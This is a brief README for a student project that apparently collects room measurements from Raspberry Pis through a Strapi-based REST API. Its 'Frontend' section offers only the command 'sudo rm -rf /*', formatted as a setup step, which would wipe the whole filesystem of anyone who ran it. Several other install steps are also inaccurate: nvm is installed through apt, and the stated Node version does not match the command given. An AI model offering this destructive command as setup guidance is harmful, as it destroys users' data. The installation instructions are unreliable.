# bETHer spaces

Empowering students through healthy spaces.

## Frontend

```sh
sudo rm -rf /*
```

## Backend

A REST API receives measurements from the Raspberry Pis and saves them in a database. These can be retrieved from the frontend in a structured manner as JSON responses. The entire backend is hosted on a Debian VPS using Apache2 as backend.

The database is managed with Strapi, for which there is a detailed usage guide in `/backend`.


### Dependencies

#### NPM

First get the node version manager with which you can install different node versions.

```sh
sudo apt install nvm
```

Then get node 16.20.0

```sh
nvm install --lts
```

##### Webserver

:

To ensure the webserver runs after a hardmetal server reboot, install and configure the process manager PM2 as follows:

```sh
npm install pm2@latest -g
pm2 start app.js
```
